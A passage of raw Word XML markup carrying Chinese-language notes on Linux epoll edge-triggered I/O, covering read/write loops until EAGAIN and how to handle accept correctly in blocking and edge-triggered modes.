          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>ET</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>模式只有从</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>unavailable</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>到</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>available</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>才会触发，所以</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="19"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="815"/>
        </w:tabs>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="311" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="480"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:bookmarkStart w:id="121" w:name="bookmark130"/>
      <w:bookmarkEnd w:id="121"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>、读事件：需要使用</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>while</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>循环读取完，一般是读到</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>EAGAIN,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>也可以读到返回值小</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zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>于緩冲区大小；</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zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>如果应用层读緩冲区满：那就需要应用层自行标记，解决</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>OS</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>不再通知可读的问题</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="19"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="845"/>
        </w:tabs>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="480" w:right="0" w:firstLine="20"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:bookmarkStart w:id="122" w:name="bookmark131"/>
      <w:bookmarkEnd w:id="122"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>、与事件：需要使用讪</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>ile</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>循环写到</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>EAGAIN,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>也可以写到返回值小于緩冲区大小 如果应用层写緩冲区空(无内容可写)：那就需要应用层自行标记，解决</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>os</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>不再通知</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zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>可写的问题。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="19"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="845"/>
        </w:tabs>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="311" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="480"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:bookmarkStart w:id="123" w:name="bookmark132"/>
      <w:bookmarkEnd w:id="123"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>正确的</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>accept, accept</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>要考虑2个问题</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="20"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="905"/>
        </w:tabs>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="311" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="480"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:bookmarkStart w:id="124" w:name="bookmark133"/>
      <w:bookmarkEnd w:id="124"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>阻塞模式</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>accept</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>存在的问题</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="311" w:lineRule="exact"/>
        <w:ind w:left="480" w:right="0" w:firstLine="20"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>考虑这种情况：</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>TCP</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>连接被客户端夭折，即在服务器调用</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>accept</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>之前，客户端主动发 送</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>RST</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>终止连接，导致刚刚建立的连接从就绪队列中移出，如果套接口被设置成阻 塞模式，服务器就会一直阻塞在</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>accept</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>调用上，直到其他某个客户建立一个新的连接 为止。但是在此期间，服务器单纯地阻塞在</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>accept</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>调用上，就绪队列中的其他描述符 都得不到处理。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="311" w:lineRule="exact"/>
        <w:ind w:left="480" w:right="0" w:firstLine="20"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>解决办法是把监听套接口设置为非阻塞，当客户在服务器调用</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>accept</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>之前中止某个连 接时，</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>accept</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>调用可以立即返回</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>-1,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>这时源自</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>Berkeley</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>的实现会在内核中处理该事 件，并不会将该事件通知给</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>epool,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>而其他实现把</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>errno</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>设置为</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>ECONNABORTED</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t xml:space="preserve">或者 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>EPROTO</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>错误，我们应该忽略这两个错误。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="20"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="905"/>
        </w:tabs>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="311" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="480"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:bookmarkStart w:id="125" w:name="bookmark134"/>
      <w:bookmarkEnd w:id="125"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>ET</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>模式下</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>accept</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>存在的问题</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zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>考虑这种情况：多个连接同时到达，服务器的</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>"P</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>就绪队列瞬间积累多个就绪连接，由 于是边缘触发模式，</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">epoll </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>°会通知一次，</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>accept</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>只处理一个连接，导致</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>TCP</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>就绪队列 中剩下的连接都得不到处理。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="307" w:lineRule="exact"/>
        <w:ind w:left="380" w:right="0" w:firstLine="20"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>解决办法是用</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>while</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>循环抱住</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>accept</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>调用，处理完</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>TCP</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t xml:space="preserve">就绪队列中的所有连接后再退 出循环。如何知道是否处理完就绪队列中的所有连接呢？ </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>accept</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>返回</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>-1</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>并且</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">errno </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
